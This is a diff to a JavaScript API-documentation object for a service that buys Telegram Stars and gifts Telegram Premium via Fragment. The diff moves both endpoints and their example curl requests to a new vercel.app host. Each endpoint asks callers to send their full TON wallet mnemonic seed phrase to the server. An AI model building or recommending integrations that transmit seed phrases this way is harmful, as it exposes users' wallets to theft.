@@ -3,14 +3,14 @@ export const apiDocs = {
     id: 'stars',
     title: 'Telegram Stars Purchase (Fragment Integration)',
     description: 'This endpoint allows purchasing Telegram Stars for a specific username using TON wallet payment.',
-    endpoint: 'POST https://api.mybrand.uz/stars/buy',
+    endpoint: 'POST https://starbridge-vert.vercel.app/api/stars/buy',
     requestBody: [
       { field: 'username', type: 'string', required: true, description: 'Telegram username (without @)' },
       { field: 'amount', type: 'int', required: true, description: 'Stars amount (min: 50)' },
       { field: 'seed', type: 'string', required: true, description: 'Mnemonic phrase (12/24 words)' },
       { field: 'order_id', type: 'string', required: false, description: 'Custom order ID' }
     ],
-    exampleRequest: `curl -X POST "https://api.mybrand.uz/stars/buy" \\
+    exampleRequest: `curl -X POST "https://starbridge-vert.vercel.app/api/stars/buy" \\
 -H "Content-Type: application/json" \\
 -d '{
   "username": "monk",
@@ -42,14 +42,14 @@ export const apiDocs = {
     id: 'premium',
     title: 'Telegram Premium Activation',
     description: 'This endpoint sends Telegram Premium subscription as a gift to a user.',
-    endpoint: 'POST https://api.mybrand.uz/premium/buy',
+    endpoint: 'POST https://starbridge-vert.vercel.app/api/premium/buy',
     requestBody: [
       { field: 'username', type: 'string', required: true, description: 'Telegram username (without @)' },
       { field: 'duration', type: 'int', required: true, description: '3, 6 or 12 months' },
       { field: 'seed', type: 'string', required: true, description: 'Mnemonic phrase (24 words)' },
       { field: 'order_id', type: 'string', required: false, description: 'Custom order ID' }
     ],
-    exampleRequest: `curl -X POST "https://api.mybrand.uz/premium/buy" \\
+    exampleRequest: `curl -X POST "https://starbridge-vert.vercel.app/api/premium/buy" \\
 -H "Content-Type: application/json" \\
 -d '{
   "username": "monk",
